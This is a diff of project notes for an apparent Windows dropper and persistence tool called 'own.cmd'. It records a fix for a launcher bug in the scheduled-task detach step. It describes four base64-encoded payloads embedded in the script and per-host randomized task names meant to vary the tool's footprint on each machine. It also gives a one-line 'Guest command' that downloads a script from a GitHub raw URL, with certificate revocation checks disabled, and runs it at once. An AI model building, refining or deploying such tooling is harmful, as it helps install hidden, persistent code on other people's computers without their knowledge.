@@ -4,7 +4,11 @@
 All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).
 
 ## Current deploy — "another level" build
-- **own.cmd O15** (86 KB, self-contained): embeds all 4 payloads as `::`-prefixed base64 blocks
+- **own.cmd O16** (self-contained): fixes launcher detach — RUNNER was set inside the `if` block but
+  referenced as `%RUNNER%` (parse-time expansion -> empty), producing `call "" _RUN` = the recurring
+  `'""' is not recognized` console error and fake "Detached OK" (task action `cmd.exe /c  _RUN` ran nothing).
+  Now `!RUNNER!` everywhere in the block + `wproof` launch-proof check: method A only reports success
+  if the worker actually wrote its proof file. Embeds all 4 payloads as `::`-prefixed base64 blocks
   (`B64_MON`/`B64_SEC`/`B64_TGR`/`B64_LIB`), extracted by `:Extract` at worker start; curl-from-repo
   remains as fallback. One download, zero repo dependency at deploy time.
 - **own_lib.ps1 L1** (NEW): per-host identity (hostname-hash seeded task-name pools, 8 names x 4 slots,
@@ -23,7 +27,7 @@ All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop con
 
 ## Preferred Guest command (self-contained)
 ```
-curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o15" && call %TEMP%\own.cmd
+curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o16" && call %TEMP%\own.cmd
 ```
 
 ## Persist (identity-driven; defaults shown)
